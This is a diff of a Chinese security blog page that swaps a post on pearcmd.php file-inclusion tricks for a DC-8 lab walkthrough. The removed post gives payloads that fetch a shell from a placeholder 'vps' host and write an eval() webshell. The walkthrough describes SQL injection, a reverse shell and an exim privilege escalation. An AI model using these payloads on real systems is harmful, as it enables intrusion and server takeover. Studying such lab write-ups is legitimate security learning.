@@ -16,25 +16,36 @@
   <meta name="author" content="FSRM">
   <meta name="keywords" content="">
   
-    <meta name="description" content="pearcmd文件包含关于这个知识点的话第一次接触还是在buu的暑假挑战赛上，下面来记录一下。 前置知识：1.register_argc_argv当phpinfo中register_argc_argv是on时，**$_SERVER[‘argv’]**可以获得命令行参数。 如下图所示:  这里是用+进行一个分隔，而不是&amp; 简单利用：既然我们可以获得命令行参数的话，我们就可以进行一个命令执行。">
+    <meta name="description" content="DC-8信息收集nmap扫描一波  可以看到开放了22和80端口 漏洞利用 在这个地方可以试试sql注入，手工发现是存在的。利用sqlmap进行跑。  发现账户密码，这个密码我们利用john进行解密。 admin这个账号没有跑出来，但是john这个账号可以得到密码  进行登录后台  然后经过一番寻找，找到了一个可以写php代码的地方。     这个地方随便填一下，然后去提交，即可执行代码。 进行一">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pearcmd文件包含">
-<meta property="og:url" content="http://example.com/2023/10/23/Pearcmd%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html">
+<meta property="og:title" content="FSRM">
+<meta property="og:url" content="http://example.com/2024/04/18/DC-8/index.html">
 <meta property="og:site_name" content="FSRM">
-<meta property="og:description" content="pearcmd文件包含关于这个知识点的话第一次接触还是在buu的暑假挑战赛上，下面来记录一下。 前置知识：1.register_argc_argv当phpinfo中register_argc_argv是on时，**$_SERVER[‘argv’]**可以获得命令行参数。 如下图所示:  这里是用+进行一个分隔，而不是&amp; 简单利用：既然我们可以获得命令行参数的话，我们就可以进行一个命令执行。">
+<meta property="og:description" content="DC-8信息收集nmap扫描一波  可以看到开放了22和80端口 漏洞利用 在这个地方可以试试sql注入，手工发现是存在的。利用sqlmap进行跑。  发现账户密码，这个密码我们利用john进行解密。 admin这个账号没有跑出来，但是john这个账号可以得到密码  进行登录后台  然后经过一番寻找，找到了一个可以写php代码的地方。     这个地方随便填一下，然后去提交，即可执行代码。 进行一">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://s2.loli.net/2023/10/23/VjbcRmHpr36ANkF.png">
-<meta property="og:image" content="https://s2.loli.net/2023/10/23/56sUAaKv3WTrDQd.png">
-<meta property="article:published_time" content="2023-10-23T14:37:03.659Z">
-<meta property="article:modified_time" content="2023-10-23T14:38:19.029Z">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404182015635.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404261913801.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404261914612.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404261923843.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404261931375.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262013226.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262014051.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262014879.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262015372.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262018594.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262022359.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262024710.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262028385.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262043229.png">
+<meta property="article:published_time" content="2024-04-18T11:58:14.396Z">
+<meta property="article:modified_time" content="2024-04-26T12:45:43.692Z">
 <meta property="article:author" content="FSRM">
-<meta property="article:tag" content="文件包含">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://s2.loli.net/2023/10/23/VjbcRmHpr36ANkF.png">
+<meta name="twitter:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404182015635.png">
   
   
   
-  <title>pearcmd文件包含 - FSRM</title>
+  <title>FSRM</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -241,7 +252,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="pearcmd文件包含"></span>
+            <span id="subtitle" data-typed-text=""></span>
           
         </div>
 
@@ -252,8 +263,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-10-23 22:37" pubdate>
-          2023年10月23日 晚上
+        <time datetime="2024-04-18 19:58" pubdate>
+          2024年4月18日 晚上
         </time>
       </span>
     
@@ -264,7 +275,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.1k 字
+          314 字
         
       </span>
     
@@ -275,7 +286,7 @@
         
         
         
-          10 分钟
+          3 分钟
         
       </span>
     
@@ -320,39 +331,39 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">pearcmd文件包含</h1>
+            <h1 id="seo-header"></h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="pearcmd文件包含"><a href="#pearcmd文件包含" class="headerlink" title="pearcmd文件包含"></a>pearcmd文件包含</h1><p>关于这个知识点的话第一次接触还是在buu的暑假挑战赛上，下面来记录一下。</p>
-<h1 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h1><h2 id="1-register-argc-argv"><a href="#1-register-argc-argv" class="headerlink" title="1.register_argc_argv"></a>1.register_argc_argv</h2><p>当phpinfo中<strong>register_argc_argv</strong>是on时，**$_SERVER[‘argv’]**可以获得命令行参数。</p>
-<p>如下图所示:</p>
-<p><img src="https://s2.loli.net/2023/10/23/VjbcRmHpr36ANkF.png" srcset="/img/loading.gif" lazyload alt="image-20231022185234849.png"></p>
-<p>这里是用+进行一个分隔，而不是&amp;</p>
-<h3 id="简单利用："><a href="#简单利用：" class="headerlink" title="简单利用："></a>简单利用：</h3><p>既然我们可以获得命令行参数的话，我们就可以进行一个命令执行。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>]);<br><span class="hljs-variable">$a</span>=(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>]);<br><span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>](<span class="hljs-variable">$a</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
-
-<p>这里把a赋值成system，把1赋值成一个命令执行。</p>
-<p><img src="https://s2.loli.net/2023/10/23/56sUAaKv3WTrDQd.png" srcset="/img/loading.gif" lazyload alt="image-20231022185727273.png"></p>
-<h1 id="pearcmd文件"><a href="#pearcmd文件" class="headerlink" title="pearcmd文件"></a>pearcmd文件</h1><p>利用的就是pearcmd.php中的pecl/pear</p>
-<p>pecl是php中用于管理拓展而使用的命令行工具，pear是pecl所依赖的类库，在php7.3之前是默认安装的，而在php7.4版本及以后是需要指定-with-pear的。</p>
-<p>不过在任意的docker镜像，pecl/pear都是默认安装的，路径在/usr/local/lib/php</p>
-<p>pearcmd.php 文件的储存路径是 /usr/share/php/pearcmd.php</p>
-<p>当执行了pear之后，就可以将$_SERVER[‘argv’]当成参数执行，如果有文件包含漏洞就可以包含pearcmd.php文件，如果可以出网的话就可以从服务器上读取shell文件，进行一个文件包含。</p>
-<p>当然了，不出网也有不出网的用法，下面是对于不出网和出网的总结。</p>
-<h2 id="出网"><a href="#出网" class="headerlink" title="出网"></a>出网</h2><p>pear可以拉远程的代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">pear install -R /tmp http:<span class="hljs-comment">//vps/shell.php</span><br></code></pre></td></tr></table></figure>
-
-<p>如果某一个文件包含是下面的代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-<p>那么出网的payload就是：?file=/usr/share/php/pearcmd.php&amp;+install+-R+/tmp+<a target="_blank" rel="noopener" href="http://vps/shell.php">http://vps/shell.php</a></p>
-<h2 id="不出网"><a href="#不出网" class="headerlink" title="不出网"></a>不出网</h2><p>pearcmd.php 文件里面有一个config-create</p>
-<p>有两个参数，第一个参数是写入文件，第二个参数是设置的路径</p>
-<p>所以在不出网的情况下就可以利用这个。</p>
-<p>payload:?+config-create+/&amp;file=/usr/share/php/pearcmd.php(或者是pearcmd 如果文件包含后面有php这个后缀)&amp;/<?=eval($_GET[1])?>+/tmp/hello.php (这个的话随便设置了)</p>
-<p>然后去访问/tmp/hello.php(当然如果文件包含的后缀带上了php，就去访问/tmp/hello)</p>
+                <h1 id="DC-8"><a href="#DC-8" class="headerlink" title="DC-8"></a>DC-8</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫描一波</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404182015635.png" srcset="/img/loading.gif" lazyload alt="image-20240418201540496"></p>
+<p>可以看到开放了22和80端口</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404261913801.png" srcset="/img/loading.gif" lazyload alt="image-20240426191323619"></p>
+<p>在这个地方可以试试sql注入，手工发现是存在的。利用sqlmap进行跑。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404261914612.png" srcset="/img/loading.gif" lazyload alt="image-20240426191428509"></p>
+<p>发现账户密码，这个密码我们利用john进行解密。</p>
+<p>admin这个账号没有跑出来，但是john这个账号可以得到密码</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404261923843.png" srcset="/img/loading.gif" lazyload alt="image-20240426192320716"></p>
+<p>进行登录后台</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404261931375.png" srcset="/img/loading.gif" lazyload alt="image-20240426193136297"></p>
+<p>然后经过一番寻找，找到了一个可以写php代码的地方。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262013226.png" srcset="/img/loading.gif" lazyload alt="image-20240426201343155"></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262014051.png" srcset="/img/loading.gif" lazyload alt="image-20240426201359908"></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262014879.png" srcset="/img/loading.gif" lazyload alt="image-20240426201415705"></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262015372.png" srcset="/img/loading.gif" lazyload alt="image-20240426201525253"></p>
+<p>这个地方随便填一下，然后去提交，即可执行代码。</p>
+<p>进行一个反弹shell</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262018594.png" srcset="/img/loading.gif" lazyload alt="image-20240426201831511"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>先来试试看suid提权</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262022359.png" srcset="/img/loading.gif" lazyload alt="image-20240426202237290"></p>
+<p>有一个exim4 先来查看一下版本信息</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262024710.png" srcset="/img/loading.gif" lazyload alt="image-20240426202452562"></p>
+<p>4.89版本的</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262028385.png" srcset="/img/loading.gif" lazyload alt="image-20240426202801103"></p>
+<p>可以查询到</p>
+<p>将其放在/var/www/html目录下 然后在/tmp目录下，利用wget下载下来。对这个sh文件进行777的权限。最后./xxx.sh -m netcat 运行即可</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262043229.png" srcset="/img/loading.gif" lazyload alt="image-20240426204331172"></p>
 
                 
               </div>
@@ -361,34 +372,6 @@
             <div>
               <div class="post-metas my-3">
   
-    <div class="post-meta mr-3 d-flex align-items-center">
-      <i class="iconfont icon-category"></i>
-      
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/web/" class="category-chain-item">web</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-    </div>
-  
-  
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="print-no-link">#文件包含</a>
-      
-    </div>
   
 </div>
 
@@ -398,8 +381,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>pearcmd文件包含</div>
-      <div>http://example.com/2023/10/23/Pearcmd文件包含/</div>
+      <div></div>
+      <div>http://example.com/2024/04/18/DC-8/</div>
     </div>
     <div class="license-meta">
       
@@ -411,13 +394,13 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年10月23日</div>
+          <div>2024年4月18日</div>
         </div>
       
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2023年10月23日</div>
+          <div>2024年4月26日</div>
         </div>
       
       
@@ -448,18 +431,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/11/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含简要概括">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">文件包含简要概括</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/09/15/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="session文件包含">
-                        <span class="hidden-mobile">session文件包含</span>
+                      <a href="/2024/04/10/DC-7/" title="DC-7">
+                        <span class="hidden-mobile">DC-7</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
